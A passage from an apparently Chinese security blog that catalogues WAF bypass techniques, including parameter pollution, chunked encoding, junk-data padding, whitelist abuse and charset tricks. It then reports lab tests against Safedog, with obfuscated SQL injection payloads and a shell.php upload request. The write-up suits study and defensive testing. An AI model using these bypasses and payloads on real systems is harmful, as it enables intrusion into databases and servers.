title="迂回作战类"></a>迂回作战类</h2><blockquote><p>主打一个侧面绕过，利用各种缺陷和特性使得<strong>waf没有解析到payload</strong>，而后端可以正常解析，不与waf的规则和策略硬刚。</p></blockquote><h3 id="Web服务器特性"><a href="#Web服务器特性" class="headerlink" title="Web服务器特性"></a>Web服务器特性</h3><blockquote><p>Web服务器解析与waf解析不同绕过</p></blockquote><h4 id="IIS-ASP"><a href="#IIS-ASP" class="headerlink" title="IIS+ASP"></a>IIS+ASP</h4><ul><li><p><code>%</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于URL请求的参数值中的%，如果和后面的字符构成的字符串在URL编码表之外，ASP脚本处理时会将其忽略。</span><br><span class="line"></span><br><span class="line">select  →  se%lect</span><br></pre></td></tr></table></figure></li><li><p><code>unicode</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS会自动解码unicode</span><br></pre></td></tr></table></figure></li></ul><h4 id="HPP–参数污染"><a href="#HPP–参数污染" class="headerlink" title="HPP–参数污染"></a>HPP–参数污染</h4><p>传递多个相同参数，利用waf和web服务器解析的参数不同来进行绕过</p><table><thead><tr><th align="left">Web 环境</th><th align="left">参数获取函数</th><th align="left">获取到的参数</th></tr></thead><tbody><tr><td align="left">PHP&#x2F;Apache</td><td align="left">$_GET(“par”)</td><td align="left">last</td></tr><tr><td align="left">JSP&#x2F;Tomcat</td><td align="left">Request.getParameter(“par”)</td><td align="left">first</td></tr><tr><td align="left">Perl(CGI)&#x2F;Apache</td><td align="left">Param(“par”)</td><td align="left">first</td></tr><tr><td align="left">Python&#x2F;Apache</td><td align="left">getvalue(“par”)</td><td align="left">[“first”,”last”]</td></tr><tr><td align="left">ASP.NET&#x2F;IIS</td><td align="left">Request.QueryString(“par”)</td><td align="left">first,last</td></tr></tbody></table><h4 id="畸形请求头"><a href="#畸形请求头" class="headerlink" title="畸形请求头"></a>畸形请求头</h4><ul><li><p>Web服务器可以解析畸形请求头，但是Waf不能解析畸形请求头</p></li><li><p>都不能解析畸形请求头，利用Web服务器的解析流程</p><p>比如shiro的一个绕过方式，使用畸形请求头来绕过waf。因为shiro是先处理cookie，然后请求到servlet被解析，所以rememberMe值是会处理的。</p></li></ul><h3 id="后端语言特性"><a href="#后端语言特性" class="headerlink" title="后端语言特性"></a>后端语言特性</h3><blockquote><p>后端代码解析与waf解析不同</p><p><strong>waf没有根据后端代码来修改策略和规则</strong></p></blockquote><h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>对请求数据进行编码，例如url编码，Unicode编码，Base64编码等，如果waf对数据不能有效的解码，而应用后端能够正常解码，就可以绕过waf。</p><p>比如</p><ul><li><p>Json数据支持Unicode编码</p></li><li><p>Base64编码</p><p><img src="/../images/image-20230909230652318.png" alt="image-20230909230652318"></p><p>​<img src="/../images/image-20230909230621472.png" alt="image-20230909230621472"></p></li><li><p>JSP支持多重Unicode编码</p></li><li><p>java支持的编码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//res</span></span><br><span class="line">&#123;<span class="string">&quot;Big5&quot;</span>,<span class="string">&quot;Big5-HKSCS&quot;</span>,<span class="string">&quot;CESU-8&quot;</span>,<span class="string">&quot;EUC-JP&quot;</span>,<span class="string">&quot;EUC-KR&quot;</span>,<span class="string">&quot;GB18030&quot;</span>,<span class="string">&quot;GB2312&quot;</span>,<span class="string">&quot;GBK&quot;</span>,<span class="string">&quot;IBM-Thai&quot;</span>,<span class="string">&quot;IBM00858&quot;</span>,<span class="string">&quot;IBM01140&quot;</span>,<span class="string">&quot;IBM01141&quot;</span>,<span class="string">&quot;IBM01142&quot;</span>,<span class="string">&quot;IBM01143&quot;</span>,<span class="string">&quot;IBM01144&quot;</span>,<span class="string">&quot;IBM01145&quot;</span>,<span class="string">&quot;IBM01146&quot;</span>,<span class="string">&quot;IBM01147&quot;</span>,<span class="string">&quot;IBM01148&quot;</span>,<span class="string">&quot;IBM01149&quot;</span>,<span class="string">&quot;IBM037&quot;</span>,<span class="string">&quot;IBM1026&quot;</span>,<span class="string">&quot;IBM1047&quot;</span>,<span class="string">&quot;IBM273&quot;</span>,<span class="string">&quot;IBM277&quot;</span>,<span class="string">&quot;IBM278&quot;</span>,<span class="string">&quot;IBM280&quot;</span>,<span class="string">&quot;IBM284&quot;</span>,<span class="string">&quot;IBM285&quot;</span>,<span class="string">&quot;IBM290&quot;</span>,<span class="string">&quot;IBM297&quot;</span>,<span class="string">&quot;IBM420&quot;</span>,<span class="string">&quot;IBM424&quot;</span>,<span class="string">&quot;IBM437&quot;</span>,<span class="string">&quot;IBM500&quot;</span>,<span class="string">&quot;IBM775&quot;</span>,<span class="string">&quot;IBM850&quot;</span>,<span class="string">&quot;IBM852&quot;</span>,<span class="string">&quot;IBM855&quot;</span>,<span class="string">&quot;IBM857&quot;</span>,<span class="string">&quot;IBM860&quot;</span>,<span class="string">&quot;IBM861&quot;</span>,<span class="string">&quot;IBM862&quot;</span>,<span class="string">&quot;IBM863&quot;</span>,<span class="string">&quot;IBM864&quot;</span>,<span class="string">&quot;IBM865&quot;</span>,<span class="string">&quot;IBM866&quot;</span>,<span class="string">&quot;IBM868&quot;</span>,<span class="string">&quot;IBM869&quot;</span>,<span class="string">&quot;IBM870&quot;</span>,<span class="string">&quot;IBM871&quot;</span>,<span class="string">&quot;IBM918&quot;</span>,<span class="string">&quot;ISO-2022-CN&quot;</span>,<span class="string">&quot;ISO-2022-JP&quot;</span>,<span class="string">&quot;ISO-2022-JP-2&quot;</span>,<span class="string">&quot;ISO-2022-KR&quot;</span>,<span class="string">&quot;ISO-8859-1&quot;</span>,<span class="string">&quot;ISO-8859-13&quot;</span>,<span class="string">&quot;ISO-8859-15&quot;</span>,<span class="string">&quot;ISO-8859-2&quot;</span>,<span class="string">&quot;ISO-8859-3&quot;</span>,<span class="string">&quot;ISO-8859-4&quot;</span>,<span class="string">&quot;ISO-8859-5&quot;</span>,<span class="string">&quot;ISO-8859-6&quot;</span>,<span class="string">&quot;ISO-8859-7&quot;</span>,<span class="string">&quot;ISO-8859-8&quot;</span>,<span class="string">&quot;ISO-8859-9&quot;</span>,<span class="string">&quot;JIS_X0201&quot;</span>,<span class="string">&quot;JIS_X0212-1990&quot;</span>,<span class="string">&quot;KOI8-R&quot;</span>,<span class="string">&quot;KOI8-U&quot;</span>,<span class="string">&quot;Shift_JIS&quot;</span>,<span class="string">&quot;TIS-620&quot;</span>,<span class="string">&quot;US-ASCII&quot;</span>,<span class="string">&quot;UTF-16&quot;</span>,<span class="string">&quot;UTF-16BE&quot;</span>,<span class="string">&quot;UTF-16LE&quot;</span>,<span class="string">&quot;UTF-32&quot;</span>,<span class="string">&quot;UTF-32BE&quot;</span>,<span class="string">&quot;UTF-32LE&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;windows-1250&quot;</span>,<span class="string">&quot;windows-1251&quot;</span>,<span class="string">&quot;windows-1252&quot;</span>,<span class="string">&quot;windows-1253&quot;</span>,<span class="string">&quot;windows-1254&quot;</span>,<span class="string">&quot;windows-1255&quot;</span>,<span class="string">&quot;windows-1256&quot;</span>,<span class="string">&quot;windows-1257&quot;</span>,<span class="string">&quot;windows-1258&quot;</span>,<span class="string">&quot;windows-31j&quot;</span>,<span class="string">&quot;x-Big5-HKSCS-2001&quot;</span>,<span class="string">&quot;x-Big5-Solaris&quot;</span>,<span class="string">&quot;x-COMPOUND_TEXT&quot;</span>,<span class="string">&quot;x-euc-jp-linux&quot;</span>,<span class="string">&quot;x-EUC-TW&quot;</span>,<span class="string">&quot;x-eucJP-Open&quot;</span>,<span class="string">&quot;x-IBM1006&quot;</span>,<span class="string">&quot;x-IBM1025&quot;</span>,<span class="string">&quot;x-IBM1046&quot;</span>,<span class="string">&quot;x-IBM1097&quot;</span>,<span class="string">&quot;x-IBM1098&quot;</span>,<span class="string">&quot;x-IBM1112&quot;</span>,<span class="string">&quot;x-IBM1122&quot;</span>,<span class="string">&quot;x-IBM1123&quot;</span>,<span class="string">&quot;x-IBM1124&quot;</span>,<span class="string">&quot;x-IBM1166&quot;</span>,<span class="string">&quot;x-IBM1364&quot;</span>,<span class="string">&quot;x-IBM1381&quot;</span>,<span class="string">&quot;x-IBM1383&quot;</span>,<span class="string">&quot;x-IBM300&quot;</span>,<span class="string">&quot;x-IBM33722&quot;</span>,<span class="string">&quot;x-IBM737&quot;</span>,<span class="string">&quot;x-IBM833&quot;</span>,<span class="string">&quot;x-IBM834&quot;</span>,<span class="string">&quot;x-IBM856&quot;</span>,<span class="string">&quot;x-IBM874&quot;</span>,<span class="string">&quot;x-IBM875&quot;</span>,<span class="string">&quot;x-IBM921&quot;</span>,<span class="string">&quot;x-IBM922&quot;</span>,<span class="string">&quot;x-IBM930&quot;</span>,<span class="string">&quot;x-IBM933&quot;</span>,<span class="string">&quot;x-IBM935&quot;</span>,<span class="string">&quot;x-IBM937&quot;</span>,<span class="string">&quot;x-IBM939&quot;</span>,<span class="string">&quot;x-IBM942&quot;</span>,<span class="string">&quot;x-IBM942C&quot;</span>,<span class="string">&quot;x-IBM943&quot;</span>,<span class="string">&quot;x-IBM943C&quot;</span>,<span class="string">&quot;x-IBM948&quot;</span>,<span class="string">&quot;x-IBM949&quot;</span>,<span class="string">&quot;x-IBM949C&quot;</span>,<span class="string">&quot;x-IBM950&quot;</span>,<span class="string">&quot;x-IBM964&quot;</span>,<span class="string">&quot;x-IBM970&quot;</span>,<span class="string">&quot;x-ISCII91&quot;</span>,<span class="string">&quot;x-ISO-2022-CN-CNS&quot;</span>,<span class="string">&quot;x-ISO-2022-CN-GB&quot;</span>,<span class="string">&quot;x-iso-8859-11&quot;</span>,<span class="string">&quot;x-JIS0208&quot;</span>,<span class="string">&quot;x-JISAutoDetect&quot;</span>,<span class="string">&quot;x-Johab&quot;</span>,<span class="string">&quot;x-MacArabic&quot;</span>,<span class="string">&quot;x-MacCentralEurope&quot;</span>,<span class="string">&quot;x-MacCroatian&quot;</span>,<span class="string">&quot;x-MacCyrillic&quot;</span>,<span class="string">&quot;x-MacDingbat&quot;</span>,<span class="string">&quot;x-MacGreek&quot;</span>,<span class="string">&quot;x-MacHebrew&quot;</span>,<span class="string">&quot;x-MacIceland&quot;</span>,<span class="string">&quot;x-MacRoman&quot;</span>,<span class="string">&quot;x-MacRomania&quot;</span>,<span class="string">&quot;x-MacSymbol&quot;</span>,<span class="string">&quot;x-MacThai&quot;</span>,<span class="string">&quot;x-MacTurkish&quot;</span>,<span class="string">&quot;x-MacUkraine&quot;</span>,<span class="string">&quot;x-MS932_0213&quot;</span>,<span class="string">&quot;x-MS950-HKSCS&quot;</span>,<span class="string">&quot;x-MS950-HKSCS-XP&quot;</span>,<span class="string">&quot;x-mswin-936&quot;</span>,<span class="string">&quot;x-PCK&quot;</span>,<span class="string">&quot;x-SJIS_0213&quot;</span>,<span class="string">&quot;x-UTF-16LE-BOM&quot;</span>,<span class="string">&quot;X-UTF-32BE-BOM&quot;</span>,<span class="string">&quot;X-UTF-32LE-BOM&quot;</span>,<span class="string">&quot;x-windows-50220&quot;</span>,<span class="string">&quot;x-windows-50221&quot;</span>,<span class="string">&quot;x-windows-874&quot;</span>,<span class="string">&quot;x-windows-949&quot;</span>,<span class="string">&quot;x-windows-950&quot;</span>,<span class="string">&quot;x-windows-iso2022jp&quot;</span>&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="多数据来源"><a href="#多数据来源" class="headerlink" title="多数据来源"></a>多数据来源</h4><p>web应用程序从多个地方取值，如</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;xxxx&#x27;</span>]</span><br></pre></td></tr></table></figure><p>可以从<code>GET,POST,HEADER,METHOD</code>等地方获取用户提交的参数。</p><p>如果waf只对<code>GET，POST</code>进行检测,没有与后端相适应，就可以绕过。</p><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4><p>Burp插件：<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: chunked  <span class="comment"># 表示BODY的传输编码方式为chunked（无Content-Length字段）</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="comment"># 指明传输的数据长度</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="number">0</span> <span class="comment"># 表示传输结束</span></span><br></pre></td></tr></table></figure><h4 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h4><p>http长连接，发送多个数据包请求，感觉跟请求走私很像</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure><p>需要关闭</p><p><img src="/../images/image-20230517113339255.png" alt="image-20230517113339255"></p><h4 id="multipart-x2F-form-data"><a href="#multipart-x2F-form-data" class="headerlink" title="multipart&#x2F;form-data"></a>multipart&#x2F;form-data</h4><blockquote><p>Multipart所以使用请求与普通的GET&#x2F;POST参数传输有非常大的区别，因为Multipart请求需要后端Web应用解析该请求包，Web容器也不会解析Multipart请求。WAF可能会解析Multipart但是很多时候可以直接绕过，比如很多WAF无法处理一个数据量较大的Multipart请求或者解析Multipart时不标准导致绕过。</p></blockquote><p><img src="/../images/image-20231020182537916.png" alt="image-20231020182537916"></p><p>更多关于<code>multipart/form-data</code>的绕过思路：<a href="http://www.moonslow.com/article/tencent_waf_bypass">月影斑驳–do9gy’s blog (moonslow.com)</a></p><h4 id="chrest编码"><a href="#chrest编码" class="headerlink" title="chrest编码"></a>chrest编码</h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>charest=cp037</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ibm869</span><br><span class="line">ibm870</span><br><span class="line">ibm871</span><br><span class="line">ibm918</span><br><span class="line">iso-2022-cn</span><br><span class="line">iso-2022-jp</span><br><span class="line">iso-2022-jp-2</span><br><span class="line">iso-2022-kr</span><br><span class="line">iso-8859-1</span><br><span class="line">iso-8859-13</span><br><span class="line">iso-8859-15</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line">payload = <span class="string">&#x27;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;</span> </span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote_plus(payload.encode(<span class="string">&quot;IBM037&quot;</span> )))</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>compress</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>deflate</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>br</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>identity</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>*</span><br></pre></td></tr></table></figure><h3 id="waf特性"><a href="#waf特性" class="headerlink" title="waf特性"></a>waf特性</h3><blockquote><p>部署方式，策略与规则缺陷</p></blockquote><h4 id="云waf"><a href="#云waf" class="headerlink" title="云waf"></a>云waf</h4><p><img src="/../images/zh-cn_image_0000001193876233.png" alt="img"></p><p>通过CNAME接入将网站域名添加到WAF后，网站所有的业务流量将被引流到WAF进行检测。WAF过滤Web应用攻击后，将正常的业务流量转发回源站服务器，从而保障网站的业务安全和数据安全。此时，WAF作为一个反向代理集群，同时参与流量的检测和转发。</p><p><img src="/../images/p613782.png" alt="CNAME接入">所以如果可以找到目标的真实ip，就可以绕过云waf。</p><p>像下面这样的是不行的</p><blockquote><p>云wafPing出来是这种的hlpqjurlppnsnvzs72xcfxxxxx7htyxpit3c39.yundunwaf3.com</p><p>虽然也有真实IP，但是域名走的waf解析，不允许IP直接访问</p></blockquote><h4 id="性能缺陷"><a href="#性能缺陷" class="headerlink" title="性能缺陷"></a>性能缺陷</h4><h5 id="脏数据"><a href="#脏数据" class="headerlink" title="脏数据"></a>脏数据</h5><p>为了防止消耗太多的CPU、内存资源，因此许多WAF只检测前面的2M或4M的内容。所以可以通过填充垃圾数据进行绕过。</p><h5 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h5><p>一些 WAF 为了减少服务器的压力，会对静态文件如<code>.png</code>、<code>.css</code>等直接放行，那么我们可以尝试伪装成静态文件来绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原来被拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># 现在不拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?1.jpg&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure><h5 id="高并发？？"><a href="#高并发？？" class="headerlink" title="高并发？？"></a>高并发？？</h5><p>用Burp的<code>Trubo Intruder</code>插件,失败</p><p>而且高并发很可能会造成业务系统出现问题。</p><h4 id="白名单机制"><a href="#白名单机制" class="headerlink" title="白名单机制"></a>白名单机制</h4><ul><li><p>文件白名单</p><blockquote><p>一些 WAF 为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。</p><p>如：WAF 设立了白名单<code>/admin</code>，那么我们的测试 payload 可以通过如下的手法来绕过</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原来被拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># 现在不拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?a=/admin&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure></li><li><p>IP白名单</p><blockquote><p>后端通过Header字段获取源IP</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR等</span><br></pre></td></tr></table></figure></li><li><p>UA白名单</p><blockquote><p>某些WAF可能为了不影响站点的SEO优化，将User-Agent为某些搜索引擎（如谷歌）的请求当作白名单处理，不检测和拦截。</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># 百度搜索老版UA</span><br><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"></span><br><span class="line"># 百度图片老版UA</span><br><span class="line">Baiduspider-image+(+http://www.baidu.com/search/spider.htm)</span><br><span class="line"></span><br><span class="line"># 新版PC</span><br><span class="line">Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"></span><br><span class="line"># 新版WAP</span><br><span class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"></span><br><span class="line"># 360搜索</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0);</span><br><span class="line"></span><br><span class="line"># 360网站安全检测</span><br><span class="line">360spider (http://webscan.360.cn)</span><br><span class="line"></span><br><span class="line"># Google</span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br><span class="line"></span><br><span class="line"># Adwords移动网络</span><br><span class="line">Googlebot-Image/1.0</span><br><span class="line"></span><br><span class="line"># Adwords移动网络</span><br><span class="line">AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 0 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari</span><br><span class="line"></span><br><span class="line"># 微软 bing，必应</span><br><span class="line">Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)</span><br><span class="line"></span><br><span class="line"># 搜狗搜索</span><br><span class="line">Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br></pre></td></tr></table></figure></li></ul><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><ol><li>一些 WAF 对于<code>get</code>请求和<code>post</code>请求的处理机制不一样，可能对 POST 请求稍加松懈，因此给<code>GET</code>请求变成<code>POST</code>请求有可能绕过拦截。</li><li>一些 WAF 检测到<code>POST</code>请求后，就不会对<code>GET</code>携带的参数进行过滤检测，因此导致被绕过。</li></ol><h2 id="正面硬刚类"><a href="#正面硬刚类" class="headerlink" title="正面硬刚类"></a>正面硬刚类</h2><blockquote><p>增增改改混淆视听，使waf的规则和策略失效</p><p><strong>基本方针</strong>：</p><ol><li>增删测试waf容忍度，确认关键点</li><li>FUZZ PAYLOAD,先保证可以绕过检测</li><li>再次进行构造使得后端能够进行解析</li></ol></blockquote><h3 id="FUZZ大法"><a href="#FUZZ大法" class="headerlink" title="FUZZ大法"></a>FUZZ大法</h3><blockquote><p>fuzz大法，使用脚本去探测WAF设备对于字符处理是否有异常，一些WAF可能由于自身的解析问题，对于某些字符解析出错，造成全局的bypass</p></blockquote><p>测试点</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1）：get请求处 </span><br><span class="line">2）：header请求处 </span><br><span class="line">3）：post urlencode内容处 </span><br><span class="line">4）：post form-data内容处</span><br></pre></td></tr></table></figure><p>基础内容</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1）编码过的0-255字符 </span><br><span class="line">2）进行编码的0-255字符 </span><br><span class="line">3）utf gbk字符</span><br></pre></td></tr></table></figure><h1 id="实验环境–安全🐕"><a href="#实验环境–安全🐕" class="headerlink" title="实验环境–安全🐕"></a>实验环境–安全🐕</h1><p>没有在代码中进行过滤，如有会说明。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win  10</span><br><span class="line">php  5.6.9</span><br><span class="line">mysql 5.7.26</span><br><span class="line">apache 2.4.39</span><br><span class="line">safe dog V3.5 </span><br></pre></td></tr></table></figure><p>配置如下，除了CC攻击，全防护</p><p><img src="/../images/image-20230516235356524.png" alt="image-20230516235356524"></p><p><img src="/../images/image-20230516150636839.png" alt="image-20230516150636839"></p><p>特征</p><p><img src="/../images/image-20230517003655268.png" alt="image-20230517003655268"></p><p><img src="/../images/image-20230517100649383.png" alt="image-20230517100649383"></p><h1 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h1><h2 id="多参数来源实验"><a href="#多参数来源实验" class="headerlink" title="多参数来源实验"></a>多参数来源实验</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>] 失败</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>] 成功</span><br></pre></td></tr></table></figure><h2 id="脏数据实验"><a href="#脏数据实验" class="headerlink" title="脏数据实验"></a>脏数据实验</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516150951130.png" alt="image-20230516150951130"></p><p>安全🐕在<code>HTTP BODY</code>中检测到了关键字，直接返回500。。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">a<span class="operator">=</span><span class="number">8172</span><span class="operator">*</span>A<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516151625299.png" alt="image-20230516151625299"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p><code>waf</code>可能直接检测长度来拦截</p><p>如安全🐕,<code>GET</code>下是不行的</p><p><img src="/../images/image-20230516151807403.png" alt="image-20230516151807403"></p><h2 id="分块传输实验"><a href="#分块传输实验" class="headerlink" title="分块传输实验"></a>分块传输实验</h2><p>成功，图没截。。</p><h2 id="正面绕过"><a href="#正面绕过" class="headerlink" title="正面绕过"></a>正面绕过</h2><p>简单fuzz</p><p><img src="/../images/image-20230517001306283.png" alt="image-20230517001306283"></p><p>可以发现不会对单一的关键字进行过滤，会对一些组合进行过滤</p><h3 id="union-select绕过"><a href="#union-select绕过" class="headerlink" title="union select绕过"></a><code>union select</code>绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union (select)</span><br><span class="line">UNiOn/*/1/*/select</span><br><span class="line">UNiOn--+%02%0d%0aselect    #注释换行</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154023102.png" alt="image-20230516154023102"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154137250.png" alt="image-20230516154137250"></p><p>在<code>/**/</code>中插入<code>/x/</code>即可，x至少为一个字符</p><h3 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221518813.png" alt="image-20230516221518813"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database<span class="comment">/**/</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221551123.png" alt="image-20230516221551123"></p><p>FUZZ结果</p><p><img src="/../images/image-20230517000942363.png" alt="image-20230517000942363"></p><p><img src="/../images/image-20230517000931846.png" alt="image-20230517000931846"></p><h3 id="select-from"><a href="#select-from" class="headerlink" title="select from"></a><code>select from</code></h3><p>硬刚G</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分块传输，脏数据等成功</span><br></pre></td></tr></table></figure><h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><h2 id="waf检测内容"><a href="#waf检测内容" class="headerlink" title="waf检测内容"></a>waf检测内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求的url</span><br><span class="line">Boundary边界</span><br><span class="line">MIME类型</span><br><span class="line">文件后缀名</span><br><span class="line">文件头</span><br><span class="line">文件内容</span><br><span class="line">访问流量</span><br></pre></td></tr></table></figure><h2 id="文件上传数据包了解"><a href="#文件上传数据包了解" class="headerlink" title="文件上传数据包了解"></a>文件上传数据包了解</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">    </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl--</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl 定义了BODY中的分界线(因为是谷歌浏览器，所以分界线为----WebKitFormBoundary加上随机字符串)</span><br><span class="line"></span><br><span class="line">--boundary <span class="comment"># 开始标志</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"> </span><br><span class="line">文件内容</span><br><span class="line">--boundary   <span class="comment"># 每两个分界线之间是具体的内容：文件上传，post传参</span></span><br><span class="line">Content-Disposition: form-data; 